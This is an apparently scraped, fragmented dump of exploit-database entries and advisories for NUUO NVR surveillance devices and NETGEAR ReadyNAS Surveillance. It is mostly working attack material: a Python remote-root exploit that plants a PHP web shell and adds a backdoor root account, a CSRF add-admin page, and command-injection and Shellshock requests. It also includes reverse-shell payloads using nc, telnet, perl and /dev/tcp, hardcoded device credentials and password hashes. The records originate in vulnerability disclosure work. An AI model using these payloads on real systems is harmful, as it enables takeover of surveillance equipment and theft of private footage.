adm:*:14495:0:99999:7:::
lp:*:14495:0:99999:7:::
sync:*:14495:0:99999:7:::
shutdown:*:14495:0:99999:7:::
halt:*:14495:0:99999:7:::
mail:*:14495:0:99999:7:::
uucp:*:14495:0:99999:7:::
operator:*:14495:0:99999:7:::
games:*:14495:0:99999:7:::
gopher:*:14495:0:99999:7:::
ftp:*:14495:0:99999:7:::
nobody:*:14495:0:99999:7:::
vcsa:!!:14564::::::
sshd:!!:14564::::::
guest::14564:0:99999:7:::
bbb:$1$gYfUNAQN$.sn8WpIO5gNoOQeZzSyBI/:16915:0:99999:7:::
-sh-3.2$"
2016-08-06,WebApps,PHP,LiquidWorm,NUUO NVRmini 2 3.0.8,Arbitrary File Deletion,"Summary: NUUO NVRmini 2 is the lightweight, portable NVR solution with NAS
Desc: Input passed to the 'filename' parameter in 'deletefile.php' is not properly","﻿
NUUO Arbitrary File Deletion Vulnerability
Vendor: NUUO Inc.
Product web page: http://www.nuuo.com
Affected version: <=3.0.8
functionality. Setup is simple and easy, with automatic port forwarding
settings built in. NVRmini 2 supports POS integration, making this the perfect
solution for small retail chain stores. NVRmini 2 also comes full equipped as
a NAS, so you can enjoy the full storage benefits like easy hard drive hot-swapping
and RAID functions for data protection. Choose NVR and know that your valuable video
data is safe, always.
sanitised before being used to delete files. This can be exploited to delete files
with the permissions of the web server using their absolute path or via directory
traversal sequences passed within the affected POST/GET parameter.
/deletefile.php:
1: <?php
2: $filename=$_POST['filename'];
3: unlink($filename);
4: if (file_exists($filename))
5:         echo ""fail"";
6: else echo ""true"";
7: ?>
Tested on: GNU/Linux 3.0.8 (armv7l)
GNU/Linux 2.6.31.8 (armv5tel)
lighttpd/1.4.28
PHP/5.5.3
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2016-5353
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5353.php
14.01.2016
POST /deletefile.php HTTP/1.1
Host: 10.0.0.17
Content-Length: x
Origin: http://10.0.0.17
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Connection: close
filename=He_molested_murdered_and_mutilated_her.mp4"
2016-08-06,WebApps,CGI,LiquidWorm,NUUO NVRmini 2 3.0.8,Remote Command Injection (Shellshock),"Summary: NUUO NVRmini 2 is the lightweight, portable NVR solution with NAS
Desc: NUUO NVRmini, NVRmini2, Crystal, NVRSolo suffers from authenticated ShellShock","﻿NUUO NVRmini 2 NE-4160 ShellShock Remote Code Execution
Vendor: NUUO Inc.
Product web page: http://www.nuuo.com
Affected version: Firmware Version: 02.02.00
NVR Version: 02.02.0000.0040
Device Pack Version: 04.07.0000.0030
functionality. Setup is simple and easy, with automatic port forwarding
settings built in. NVRmini 2 supports POS integration, making this the perfect
solution for small retail chain stores. NVRmini 2 also comes full equipped as
a NAS, so you can enjoy the full storage benefits like easy hard drive hot-swapping
and RAID functions for data protection. Choose NVR and know that your valuable video
data is safe, always.
vulnerability. This could allow an attacker to gain control over a targeted computer
if exploited successfully. The vulnerability affects Bash, a common component known
as a shell that appears in many versions of Linux and Unix.
Tested on: GNU/Linux 2.6.31.8 (armv5tel)
lighttpd/1.4.28
PHP/5.5.3
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2016-5352
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5352.php
14.01.2016
POST /cgi-bin/cgi_system HTTP/1.1
Host: 10.0.0.17
Content-Length: 91
Origin: http://10.0.0.17
X-Requested-With: XMLHttpRequest
User-Agent: () { :;}; /bin/ls -al
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: */*
Referer: http://10.0.0.17/protocol_ftp.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Cookie: PHPSESSID=3bc601000ea8f085c22cb37b9b102b7f; lang=en
Connection: close
cmd=ftp_setup&act=modify&com_port=21&pasv_port_from=1024&pasv_port_to=65535&services=enable
Response:
HTTP/1.1 200 OK
Connection: close
Date: Fri, 15 Jan 2016 13:09:11 GMT
Server: lighttpd/1.4.28
Content-Length: 1652
drwxr-xr-x    3 root     root           402 Oct 20  2014 .
drwxr-xr-x    6 root     root          1024 Jan  4 22:49 ..
-rwxr-xr-x    1 root     root        256564 Oct 20  2014 DaylightSavingWatcher
-rwxr-xr-x    1 root     root         51376 Oct 20  2014 NuDatTool
-rwxr-xr-x    1 root     root         60500 Oct 20  2014 NuDiscovery
-rwxr-xr-x    1 root     root        930652 Oct 20  2014 NuHWMgn
-rwxr-xr-x    1 root     root          8236 Oct 20  2014 NuNICWatcher
-rwxr-xr-x    1 root     root           309 Oct 20  2014 after_mount.sh
lrwxrwxrwx    1 root     root             7 Oct 20  2014 archive_mrg_mv -> lite_mv
-rwxr-xr-x    1 root     root       1114844 Oct 20  2014 auto_upgrade
lrwxrwxrwx    1 root     root             7 Oct 20  2014 cgi_main -> lite_mv
-rwxr-xr-x    1 root     root        576992 Oct 20  2014 cgi_system
lrwxrwxrwx    1 root     root             7 Oct 20  2014 ddns_update -> lite_mv
-rwxr-xr-x    1 root     root           570 Oct 20  2014 getdhcpip.sh
-rwxr-xr-x    1 root     root           388 Oct 20  2014 halt
drwxr-xr-x    2 root     root            41 Oct 20  2014 lib
-rwxr-xr-x    1 root     root       3827188 Oct 20  2014 lite_mv
-rwxr-xr-x    1 root     root         15396 Oct 20  2014 nagent_mv
-rwxr-xr-x    1 root     root          9836 Oct 20  2014 nu_btns
-rwxr-xr-x    1 root     root          3496 Oct 20  2014 nudaemon
-rwxr-xr-x    1 root     root         10616 Oct 20  2014 nufancontrol
-rwxr-xr-x    1 root     root         12772 Oct 20  2014 nuklogd
-rwxr-xr-x    1 root     root           392 Oct 20  2014 reboot
-rwxr-xr-x    1 root     root         13144 Oct 20  2014 thwstat
FTP Setup OK"
2016-08-06,WebApps,PHP,LiquidWorm,NUUO NVRmini 2 3.0.8,Multiple OS Command Injections,"Summary: NUUO NVRmini 2 is the lightweight, portable NVR solution with NAS
Desc: NUUO NVRmini, NVRmini2, Crystal, NVRSolo and NVRTitan suffers from multiple","﻿NUUO Multiple OS Command Injection Vulnerabilities
Vendor: NUUO Inc.
Product web page: http://www.nuuo.com
Affected version: <=3.0.8 (NE-4160, NT-4040, NT-4040(R))
DP: <=04.07.0000.0030, <=04.03.0000.0035
FW: <=02.02.00, <=1.7.0
functionality. Setup is simple and easy, with automatic port forwarding
settings built in. NVRmini 2 supports POS integration, making this the perfect
solution for small retail chain stores. NVRmini 2 also comes full equipped as
a NAS, so you can enjoy the full storage benefits like easy hard drive hot-swapping
and RAID functions for data protection. Choose NVR and know that your valuable video
data is safe, always.
NUUO Titan NVR is NUUO's Linux-based open platform recording solution. It is built
on Linux Foundation, with cross-platform Windows and MAC client software. It supports
up to 64 channels of megapixel recording with 250 Mbps throughput. It also comes with
a myriads of features that will sure to fulfill even the most demanding projects. Supports
over 2300 camera models from over 100 vendors.
authenticated OS command injection vulnerabilities. This can be exploited to inject
and execute arbitrary shell commands as the root user.
Tested on: GNU/Linux 3.0.8 (armv7l)
GNU/Linux 2.6.31.8 (armv5tel)
lighttpd/1.4.28
lighttpd/1.4.35
PHP/5.5.3
PHP/5.6.0
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2016-5351
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5351.php
14.01.2016
NVRTitan:
POST /handle_iscsi.php HTTP/1.1
Host: 10.0.0.17
Content-Length: x
Origin: http://10.0.0.17
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: */*
Referer: http://10.0.0.17/iscsi.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Cookie: PHPSESSID=c9fdced9e8129eb4c14e3154cd0e0ce3; lang=en; loginName=admin
Connection: close
act=discover&address=1.1.1.1|echo%20pwn&port=3260
HTTP/1.1 200 OK
X-Powered-By: PHP/5.6.0
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-type: text/html; charset=UTF-8
Connection: close
Date: Mon, 18 Apr 2016 08:52:17 GMT
Server: lighttpd/1.4.35
Content-Length: x
pwn
NVRmini/2/Solo/Crystal:
GET /cgi-bin/cgi_system?cmd=raid_setup&act=getsmartinfo&devname=|ping%20-n%200%20localhost&rand=1452765315144 HTTP/1.1
Host: 10.0.0.17
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
X-Requested-With: XMLHttpRequest
Accept: */*
Referer: http://10.0.0.17/raid.php
Accept-Encoding: gzip, deflate, sdch
Accept-Language: en-US,en;q=0.8
Cookie: PHPSESSID=3bc601000ea8f085c22cb37b9b102b7f; lang=en
Connection: close
POST /cgi-bin/cgi_system?cmd=saveconfig HTTP/1.1
Host: 10.0.0.17
Content-Length: 97
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: http://10.0.0.17
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Referer: http://10.0.0.17/save_config.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Cookie: PHPSESSID=3bc601000ea8f085c22cb37b9b102b7f; lang=en
Connection: close
bfolder=%2Fmtd%2Fblock3&bfile=|ping%20-n%200%20localhost&inc_emap=no&inc_pos=no
Sample session from commix:
Shell > whoami
root
Shell > ls
Default.ini EMap PatrolOpt003.xml PatrolOpt009.xml PatrolOpt015.xml access apcupsd authority.lic auto_upgrade.ini autoarchive.ini camera.ini cameraparam.ini cmsserver.ini cmsstat daylightsaving.ini ddns.ini dualstreaming.ini email.ini eventaction.ini ezNUUO iobox.ini lenssetting.ini lighttpd-inc.conf lighttpd.conf liveserver.ini notice.ini nuservice.conf pos proftpd-inc.conf pushnotification raid_info.xml recordingmode.ini schedule.ini scheduler_dio.ini scheduler_motion.ini smb-inc.conf version.xml"
2016-08-06,WebApps,PHP,LiquidWorm,NUUO NVRmini 2 3.0.8,Local File Disclosure,"Summary: NUUO NVRmini 2 is the lightweight, portable NVR solution with NAS
Desc: NUUO NVRmini, NVRmini2, Crystal and NVRSolo suffers from a file disclosure
//echo   ""Key: $key; Value: $value <br/>\n "";
//system(""echo \""Key: $key; Value: $value <br/>\n \"" >> $filename"");","﻿NUUO Local File Disclosure Vulnerability
Vendor: NUUO Inc.
Product web page: http://www.nuuo.com
Affected version: <=3.0.8 (NE-4160, NT-4040)
functionality. Setup is simple and easy, with automatic port forwarding
settings built in. NVRmini 2 supports POS integration, making this the perfect
solution for small retail chain stores. NVRmini 2 also comes full equipped as
a NAS, so you can enjoy the full storage benefits like easy hard drive hot-swapping
and RAID functions for data protection. Choose NVR and know that your valuable video
data is safe, always.
vulnerability when input passed thru the 'css' parameter to 'css_parser.php' script
is not properly verified before being used to include files. This can be exploited
to disclose contents of files from local resources.
Tested on: GNU/Linux 3.0.8 (armv7l)
GNU/Linux 2.6.31.8 (armv5tel)
lighttpd/1.4.28
PHP/5.5.3
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2016-5350
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5350.php
14.01.2016
Request:
GET http://10.0.0.17/css_parser.php?css=__nvr_dat_tool___.php HTTP/1.1
Response:
<?php
include('utils.php');
header(""Expires: Thu, 19 Nov 1981 08:52:00 GMT"");
header(""Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0"");
header(""Pragma: no-cache"");
session_start();
<html>
<head>
<meta http-equiv=""Content-Type"" content=""text/html; charset=UTF-8"">
<title>DatTool</title>
</head>
<body>
<?php
if (isset($_POST) && isset($_POST['username']) && isset($_POST['password']))
if ($_POST['username'] != 'nuuoeng' || $_POST['password'] != 'qwe23622260')
exit(0);
if (isset($_POST['act']) && $_POST['act'] == 'checkdat')
echo '<script language=""javascript"">';
echo 'alert(""The system will start to repair videos right after system reboot. Please go to Setting Page to reboot system manually."")';
echo '</script>';
touch(constant(""FLASH_FOLDER"").""/checkdat"");
<p>Click the Repair button to repair the recorded videos became black due to incorrect video format. It may take a long time to repair videos, which depends on the amount of video files.</p>
<form method=""POST"" action=""<?php echo $_SERVER['PHP_SELF']; ?>"" name=""form0"">
<input type=""hidden"" name=""username"" value=""<?php echo $_POST['username']; ?>"">
<input type=""hidden"" name=""password"" value=""<?php echo htmlspecialchars( $_POST['password'] ); ?>"">
<input type=""hidden"" name=""act""      value=""checkdat"">
<input type=""submit"" value=""Repair"" name=""submit"" >
</form>
<?php
else
<form method=""POST"" action=""<?php echo $_SERVER['PHP_SELF']; ?>"" name=""form0"">
Usermame: <input type=""text"" size=""15"" name=""username"" value=""""><br />
Password: <input type=""password"" size=""15"" name=""password"" value=""""><br />
<input type=""submit"" value=""Submit"" name=""submit"" >
</form>
<?php
</body>
</html>
Request:
GET http://10.0.0.17/css_parser.php?css=css_parser.php HTTP/1.1
Response:
<?php
if(!isset($_GET['css']))exit('/* please supply a ""css"" parameter */');
$filename=$_GET['css'];
if(strpos($filename,'..')!==false)exit('/* please use an absolute address for your css */');
$filename=$_SERVER['DOCUMENT_ROOT'].'/'.$filename;
if(!file_exists($filename))exit('/* referred css file does not exist */');
header('content-type:text/css');
header(""Expires: "".gmdate(""D, d M Y H:i:s"", (time()+900)) . "" GMT"");
$matches=array();
$names=array();
$values=array();
$file=file_get_contents($filename);
foreach   ($_GET as $key=>$value)
if ($key != 'css')
$file = str_replace($key,$value,$file);
echo $file;
foreach(array_reverse($matches[0]) as $match){
$match=preg_replace('/\s+/',' ',rtrim(ltrim($match)));
$names[]=preg_replace('/\s.*//*','',$match);
$values[]=preg_replace('/^[^\s]*\s/','',$match);"
2016-08-06,WebApps,PHP,LiquidWorm,NUUO NVRmini 2 3.0.8,Cross-Site Request Forgery (Add Admin),"Summary: NUUO NVRmini 2 is the lightweight, portable NVR solution with NAS
Desc: The application interface allows users to perform certain actions via HTTP","﻿<!--
NUUO CSRF Add Admin Exploit
Vendor: NUUO Inc.
Product web page: http://www.nuuo.com
Affected version: <=3.0.8 (NE-4160, NT-4040)
functionality. Setup is simple and easy, with automatic port forwarding
settings built in. NVRmini 2 supports POS integration, making this the perfect
solution for small retail chain stores. NVRmini 2 also comes full equipped as
a NAS, so you can enjoy the full storage benefits like easy hard drive hot-swapping
and RAID functions for data protection. Choose NVR and know that your valuable video
data is safe, always.
requests without performing any validity checks to verify the requests. This can be
exploited to perform certain actions with administrative privileges if a logged-in
user visits a malicious web site.
Tested on: GNU/Linux 3.0.8 (armv7l)
GNU/Linux 2.6.31.8 (armv5tel)
lighttpd/1.4.28
PHP/5.5.3
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2016-5349
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5349.php
14.01.2016
<!-- 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 -->
<html>
<body>
<form action=""http://10.0.0.17/users_xml.php"">
<input type=""hidden"" name=""&#95;password2"" value=""admin"" />
<input type=""hidden"" name=""addusername"" value=""csrfadmin"" />
<input type=""hidden"" name=""password"" value=""admin"" />
<input type=""hidden"" name=""cmd"" value=""adduser"" />
<input type=""hidden"" name=""group"" value=""poweruser"" />
<input type=""hidden"" name=""displaygroup"" value=""power&#32;user"" />
<input type=""hidden"" name=""magic"" value=""574"" />
<input type=""hidden"" name=""liveacc"" value=""1&#44;2&#44;3&#44;4&#44;5&#44;6&#44;7&#44;8&#44;9&#44;10&#44;11&#44;12&#44;13&#44;14&#44;15&#44;16"" />
<input type=""hidden"" name=""pbacc"" value=""1&#44;2&#44;3&#44;4&#44;5&#44;6&#44;7&#44;8&#44;9&#44;10&#44;11&#44;12&#44;13&#44;14&#44;15&#44;16"" />
<input type=""hidden"" name=""ptzacc"" value=""1"" />
<input type=""hidden"" name=""ioacc"" value=""1"" />
<input type=""hidden"" name=""backupacc"" value=""1"" />
<input type=""hidden"" name=""deleteacc"" value=""1"" />
<input type=""hidden"" name=""emapeacc"" value=""1"" />
<input type=""hidden"" name=""remotalkacc"" value=""1"" />
<input type=""hidden"" name=""logacc"" value=""1"" />
<input type=""submit"" value=""Submit request"" />
</form>
</body>
</html>"
2016-08-06,WebApps,PHP,LiquidWorm,NUUO NVRmini 2 3.0.8,Remote Code Execution,"# NUUO Remote Root Exploit
# Vendor: NUUO Inc.
# Product web page: http://www.nuuo.com
# Affected version: <=3.0.8
# Summary: NUUO NVRmini 2 is the lightweight, portable NVR solution with NAS
# functionality. Setup is simple and easy, with automatic port forwarding
# settings built in. NVRmini 2 supports POS integration, making this the perfect
# solution for small retail chain stores. NVRmini 2 also comes full equipped as
# a NAS, so you can enjoy the full storage benefits like easy hard drive hot-swapping
# and RAID functions for data protection. Choose NVR and know that your valuable video
# data is safe, always.
# Desc: NUUO NVRmini, NVRmini2, Crystal and NVRSolo suffers from an unauthenticated command
# injection vulnerability. Due to an undocumented and hidden debugging script, an attacker
# can inject and execute arbitrary code as the root user via the 'log' GET parameter in the
# '__debugging_center_utils___.php' script.
# -----------------------------------------------------
# $ nuuo.py 10.0.0.17 80
# [*] ==============================================
# [*] NUUO NVR/DVR/NDVR Remote Root Exploit
# [*] Zero Science Lab - http://www.zeroscience.mk
# [*] ==============================================
# [*] Backdoor detected!
# [*] Add root user (y/n)? n
# [*] Press [ ENTER ] to start root shell...
# root@nuuo:~# id
# uid=0(root) gid=0(root)
# root@nuuo:~# exit
# [*] Removing raidh.php file
# [*] Session terminated!
# $
# -----------------------------------------------------
# Tested on: GNU/Linux 3.0.8 (armv7l)
#            GNU/Linux 2.6.31.8 (armv5tel)
#            lighttpd/1.4.28
#            PHP/5.5.3
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
# Zero Science Lab - http://www.zeroscience.mk
# Advisory ID: ZSL-2016-5348
# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5348.php
# NSE Script: http://www.zeroscience.mk/codes/nuuo-backdoor.nse
# https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/40209.zip
# 14.01.2016","﻿#!/usr/bin/env python
import os######
import sys#####
import time####
import urllib##
import binascii
import requests
__author__ = 'lqwrm'
def persist(host,port,hexy,clean):
pwd = '''echo 'roOt:x:0:0:PWNED account:/:/bin/bash' >> /etc/passwd'''
sdw = '''echo 'roOt:$1$MJOnV/Y3$tDnMIBMy0lEQ2kDpfgTJP0:16914:0:99999:7:::' >> /etc/shadow'''
print '[*] Adding user \'roOt\' with password \'rewt\' in passwd file.'
requests.get('http://'+host+':'+port+'/raidh.php?cmd='+pwd)
time.sleep(2)
print '[*] Updating shadow file.'
requests.get('http://'+host+':'+port+'/raidh.php?cmd='+sdw)
time.sleep(2)
print '[*] Shell awaits: ssh roOt@'+host
requests.get('http://'+host+':'+port+'/raidh.php?cmd='+urllib.quote(clean))
exit(0)
def check(host,port,hexy):
try:
r = requests.get('http://'+host+':'+port+'/'+hexy, allow_redirects=False)
if r.status_code == 200:
print '[*] Backdoor detected!'
pass
else:
print '[*] No backdoors here. :('
exit(0)
except Exception:
print '[*] Could not connect.'
exit(0)
def main():
print '[*] =============================================='
print '[*] NUUO NVR/DVR/NDVR Remote Root Exploit'
print '[*] Zero Science Lab - http://www.zeroscience.mk'
print '[*] =============================================='
if (len(sys.argv) <= 2):
print '[*] Usage: nuuo.py <ipaddress> <port>'
exit(0)
host = sys.argv[1]
port = sys.argv[2]
dbgcu = '5f5f64'#
dbgcu+= '656275'#
dbgcu+= '676769'#
dbgcu+= '6e675f'#
dbgcu+= '63656e'#
dbgcu+= '746572'#
dbgcu+= '5f7574'#
dbgcu+= '696c73'#
dbgcu+= '5f5f5f'#
dbgcu+= '2e7068'#
dbgcu+= '70'###'#
hexy = binascii.unhexlify(dbgcu)
check (host,port,hexy)
payload = '''echo ""<?php system(\$_REQUEST[\'cmd\']); ?>"" > raidh.php'''
requests.get('http://'+host+':'+port+'/'+hexy+'?log=1337;' + payload)
clean = 'rm raidh.php'
a1 = raw_input('[*] Add root user (y/n)? ')
if a1.strip() == 'y' or a1.strip() == 'Y':
persist (host,port,hexy,clean)
else:
pass
print '[*] Press [ ENTER ] to start root shell...'
raw_input()
while True:
try:
cmd = raw_input('root@nuuo:~# ')
if cmd.strip() == '':
print '[*] Give me a command!\n'
continue
else:
e = requests.get('http://'+host+':'+port+'/raidh.php?cmd='+urllib.quote(cmd))
print e.text
if cmd.strip() == 'exit':
print '[*] Removing raidh.php file'
requests.get('http://'+host+':'+port+'/raidh.php?cmd='+urllib.quote(clean))
print '[*] Session terminated!'
break
except Exception:
break
if __name__ == ""__main__"":
main()"
2016-08-05,Remote,Hardware,Pedro Ribeiro,NUUO NVRmini2 / NVRsolo / Crystal Devices / NETGEAR ReadyNAS Surveillance Application,Multiple Vulnerabilities,"#1
#2
#3
#4
#5
#root:$1$1b0pmacH$sP7VdEAv01TvOk1JSl2L6/:14495:0:99999:7:::
#root:$1$1b0pmacH$sP7VdEAv01TvOk1JSl2L6/:14495:0:99999:7:::
#6
#7
#0  0x61616160 in ?? ()
http://www.agileinfosec.co.uk/",">> Multiple vulnerabilities in NUUO NVRmini2 / NVRsolo / Crystal devices and NETGEAR ReadyNAS Surveillance application
>> Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security (http://www.agileinfosec.co.uk/)
Disclosure: 04/08/2016 / Last updated: 04/08/2016
>> Background on the affected products:
""NUUO NVRmini 2 is the lightweight, portable NVR solution with NAS functionality. Setup is simple and easy, with automatic port forwarding settings built in. NVRmini 2 supports POS integration, making this the perfect solution for small retail chain stores. NVRmini 2 also comes full equipped as a NAS, so you can enjoy the full storage benefits like easy hard drive hot-swapping and RAID functions for data protection. Choose NVR and know that your valuable video data is safe, always.""
""NVRsolo is NUUO’s answer to hassle free, lightweight NVR system. It is small in size yet able to handle heavy duty tasks. With local HDMI/VGA display and keyboard/mouse input built right into the unit, configuring NVRsolo is easy and simple. Built on solid Linux foundation, we sacrificed nothing except unnecessary bulk to make NVRsolo the award winning standalone NVR solution you have been looking for. NVRsolo's flexibility doesn't end there. For those needing more storage options, we offer 8 bay versions to meet your needs.""
""NUUO Crystal™ is the product that represents the next stage in VMS evolution. Rock solid, easily manageable, with powerful recording and viewing options available. Featuring revolutionary modular system structure that is made to handle large project size, NUUO Crystal™ is the ideal choice for your enterprise. Featuring technology that focuses on delivering stable video recording performance, recording failover, and 3rd party integration choice, you will be impressed with the stability and flexible options with NUUO Crystal™.""
""(ReadyNAS Surveillance) NETGEAR combines leading storage and switching solutions together with sophisticated network video recording software to provide an affordable and easy to install and manage surveillance solution. Small businesses and corporate branch offices require a secure way to protect physical assets, but may lack deep security expertise or a big budget. A user-friendly NVR system should combine fast and flexible configuration with easy operation. With a few simple steps for installation, the web-based management leads users to configure, monitor and playback video everywhere. UPnP search, auto camera detection and GUI schedule save setting-up time, while the easy drag and drop camera, auto scan, preset point patrolling, and multiple views offer users a prime monitoring experience.""
>> Summary:
NUUO is a vendor of Network Video Recording (NVR) systems for surveillance cameras. These NVR are Linux embedded video recording systems that can manage a number of cameras and are used worldwide by public institutions, banks, SME's, etc. They also provide a software package to NETGEAR that adds network video recording and monitoring capabilities to the well known NETGEAR ReadyNAS Network Attached Storage systems.
The web interface contains a number of critical vulnerabilities that can be abused by unauthenticated attackers. These consist of monitoring backdoors left in the PHP files that are supposed to be used by NUUO's engineers, hardcoded credentials, poorly sanitised input and a buffer overflow which can be abused to achieve code execution on NUUO's devices as root, and on NETGEAR as the admin user.
Although only the NVRmini 2, NVRsolo, Crystal and ReadyNAS Surveillance devices are known to be affected, it is likely that the same code is used in other NUUO devices or even other third party devices (the firmware is littered with references to other devices like NUUO Titan). However this has not been confirmed as it was not possible to access all NUUO and third party devices that might be using the same code.
A special thanks to CERT/CC (https://www.cert.org/) for assistance with disclosing the vulnerabilities to the vendors [1]. Metasploit exploits for #1, #2 and #3 have been released.
>> Technical details:
Vulnerability: Improper Input Validation (leading to remote code execution)
CVE-2016-5674
Attack Vector: Remote
Constraints: None, can be exploited by an unauthenticated attacker
Affected products / versions:
- NUUO NVRmini 2, firmware v1.7.5 to 3.0.0 (older firmware versions might be affected)
- NUUO NVRsolo, firmware v1.0.0 to 3.0.0
- ReadyNAS Surveillance, v1.1.1 to v1.4.1 (affects both x86 and ARM versions, older versions might be affected)
- Other NUUO products that share the same web interface might be affected
The web inteface contains a hidden file named __debugging_center_utils___.php that improperly sanitises input to the log parameter, which is passed to the PHP system() call (snippet below):
function print_file($file_fullpath_name)
$cmd = ""cat "" . $file_fullpath_name;
echo $file_fullpath_name . ""\n\n"";
system($cmd);
<?php
if (isset($_GET['log']) && !empty($_GET['log']))
$file_fullpath_name = constant('LOG_FILE_FOLDER') . '/' . basename($_GET['log']);
print_file($file_fullpath_name);
else
die(""unknown command."");
The file can be accessed by an unauthenticated user, and code execution can be achieved with the following proofs of concept:
- ReadyNAS Surveillance:
GET /__debugging_center_utils___.php?log=something%3bperl+-MIO%3a%3aSocket+-e+'$p%3dfork%3bexit,if($p)%3b$c%3dnew+IO%3a%3aSocket%3a%3aINET(PeerAddr,""192.168.1.204%3a9000"")%3bSTDIN->fdopen($c,r)%3b$~->fdopen($c,w)%3bsystem$_+while<>%3b'
This will connect a shell back to 192.168.1.204 on port 9000, running as the ""admin"" user.
- NVRmini 2 and NVRsolo:
GET /__debugging_center_utils___.php?log=something%3btelnet+192.168.1.204+9999+|+bash+|+telnet+192.168.1.204+9998
This will connect two shells to 192.168.1.204, one on port 9999 and another on port 9998. To execute commands, echo into the 9999 shell, and receive the output on the 9998 shell. Commands will run as the root user.
Vulnerability: Improper Input Validation (leading to remote code execution)
CVE-2016-5675
Attack Vector: Remote
Constraints: Requires an administrator account
Affected products / versions:
- NUUO NVRmini 2, firmware v1.7.5 to 3.0.0 (older firmware versions might be affected)
- NUUO NVRsolo, firmware v1.0.0 to 3.0.0
- NUUO Crystal, firmware v2.2.1 to v3.2.0 (older firmware versions might be affected)
- ReadyNAS Surveillance, v1.1.1 to v1.4.1 (affects both x86 and ARM versions, older versions might be affected)
- Other NUUO products that share the same web interface might be affected
The handle_daylightsaving.php page does not sanitise input from the NTPServer parameter correctly and passes it to a PHP system() command (code snippet below):
else if ($act == 'update')
$cmd = sprintf(""/usr/bin/ntpdate %s"", $_GET['NTPServer']);
$find_str = ""time server"";
$sys_msg = system($cmd);
$pos = strpos($sys_msg, $find_str);
The file can only be accessed by an authenticted user.
- ReadyNAS Surveillance:
GET /handle_daylightsaving.php?act=update&NTPServer=bla%3b+whoami+>+/tmp/test
This will create a /tmp/test file with the contents of ""admin"" (current user).
- NVRmini 2 and NVRsolo:
GET /handle_daylightsaving.php?act=update&NTPServer=bla%3brm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+192.168.1.204+9000+>/tmp/f
Connects a shell to 192.168.1.204, port 9000, running as root.
- Crystal:
GET /handle_daylightsaving.php?act=update&NTPServer=bla%3bbash+-i+>%26+/dev/tcp/192.168.1.204/4444+0>%26
Connects a shell to 192.168.1.204, port 4444, running as root.
Vulnerability: Administrator password reset
CVE-2016-5676
Attack Vector: Remote
Constraints: None, can be exploited by an unauthenticated attacker
Affected products / versions:
- NUUO NVRmini 2, firmware v1.7.5 to unknown (latest version v3.0.0 requires authentication)
- NUUO NVRsolo, firmware v1.7.5 to unknown (latest version v3.0.0 requires authentication)
- ReadyNAS Surveillance, v1.1.1 to v1.4.1 (affects both x86 and ARM versions, older versions might be affected)
- Other NUUO products that share the same web interface might be affected
On older versions of the firmware and in the ReadyNAS Surveillance application unauthenticated users can call the cgi_system binary from the web interface. This binary performs a number of sensitive system commands, such as the loading of the default configuration that resets the administrator password. It seems that at least versions 2.2.1 and 3.0.0 of the NVRmini 2 and NVRsolo firmware are not affected, so this vulnerability was fixed either on these or earlier versions, but ReadyNAS Surveillance is still vulnerable.
Proof of concept:
GET /cgi-bin/cgi_system?cmd=loaddefconfig
This will reset the admin password of the web interface to admin or password (depending on the firmware version) on all affected devices.
Vulnerability: Information disclosure (system processes, available memory and filesystem status)
CVE-2016-5677
Attack Vector: Remote
Constraints: None, can be exploited by an unauthenticated attacker
Affected products / versions:
- NUUO NVRmini 2, firmware v1.7.5 to 3.0.0 (older firmware versions might be affected)
- NUUO NVRsolo, firmware v1.0.0 to 3.0.0
- ReadyNAS Surveillance, v1.1.1 to v1.4.1 (affects both x86 and ARM versions, older versions might be affected)
- Other NUUO products that share the same web interface might be affected
The web interface contains a hidden page (__nvr_status___.php) with a hardcoded username and password that lists the current system processes, available memory and filesystem status. This information can be obtained by an unauthenticated user by performing the following request:
POST /__nvr_status___.php HTTP/1.1
username=nuuoeng&password=qwe23622260&submit=Submit
Vulnerability: Harcoded root password
CVE-2016-5678
Affected products / versions:
- NUUO NVRmini 2, firmware v1.0.0 to 3.0.0
- NUUO NVRsolo, firmware v1.0.0 to 3.0.0
